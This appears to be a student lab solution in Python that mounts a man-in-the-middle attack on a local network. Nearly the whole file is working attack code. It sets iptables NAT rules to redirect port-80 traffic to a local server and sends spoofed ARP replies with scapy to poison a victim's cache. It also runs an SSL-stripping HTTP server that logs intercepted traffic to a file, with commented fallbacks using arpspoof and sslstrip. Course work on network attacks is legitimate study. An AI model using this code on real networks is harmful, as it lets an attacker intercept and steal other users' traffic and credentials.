import os, sys, subprocess
from multiprocessing import Process

from scapy.all import *
import time

from server import run_server

# =============================================
# ========= write your code below  ============
# =============================================

def init():
    #reset
    subprocess.call('iptables -F'.split(' '))
    subprocess.call('iptables -F -t nat'.split(' '))
    subprocess.call('iptables -F -t mangle'.split(' '))
    
    for command in ['iptables -t nat -A POSTROUTING -o eth1 -j MASQUERADE',
    'iptables -A FORWARD -i eth1 -o eth0 -m state --state RELATED,ESTABLISHED -j ACCEPT',
    'iptables -A FORWARD -i eth0 -o eth1 -j ACCEPT']:
        proc = subprocess.Popen(command, shell=True)

    subprocess.Popen("iptables -t nat -A PREROUTING -p tcp -i eth0 -d 142.1.97.172 --dport 80 -j DNAT --to-destination 10.0.0.3:8080",shell=True)
    
def arp_spoof():
    # Use the command arpspoof at first 
    # subprocess.call('arpspoof -i eth0 -t 10.0.0.2 10.0.0.1'.split(' '))
    #  but the final attack should use scapy to send spoofed ARP packets
    send(ARP(op= 2, psrc="10.0.0.1", pdst="10.0.0.2", hwdst=get_if_hwaddr('eth0')), inter=1, loop=1)
    
def ssl_stripping(filepath):
    # Use the sslstripping command at first 
    # subprocess.call('python2 /root/sslstrip/sslstrip.py -a -w {0} -l 8080 -f'.format(filepath).split(' '))  
    # but the final attack should use your own HTTP server that will do the stripping
    run_server(filepath)

# =============================================
# ===== do not modify the code below ==========
# =============================================

def run(filepath):
    init()
    
    arp_process = Process(target=arp_spoof)
    stripping_process = Process(target=ssl_stripping, args=(filepath,))
    arp_process.start()
    stripping_process.start()
    stripping_process.join()
    #time.sleep(600)
    arp_process.terminate()

if __name__ == "__main__":
    import os, sys, getopt
    def usage():
       print ('Usage:    ' + os.path.basename(__file__) + ' filepath ')
       sys.exit(2)
    # extract parameters
    try:
         opts, args = getopt.getopt(sys.argv[1:],"h",["help"])
    except getopt.GetoptError as err:
         print(err)
         usage()
         sys.exit(2)
    filepath = args[0] if len(args) > 0 else None
    for opt, arg in opts:
        if opt in ("-h", "--help"):
           usage()
    if (filepath is None):
        print('filepath is missing\n')
        usage()
    # run the command
    run(filepath)
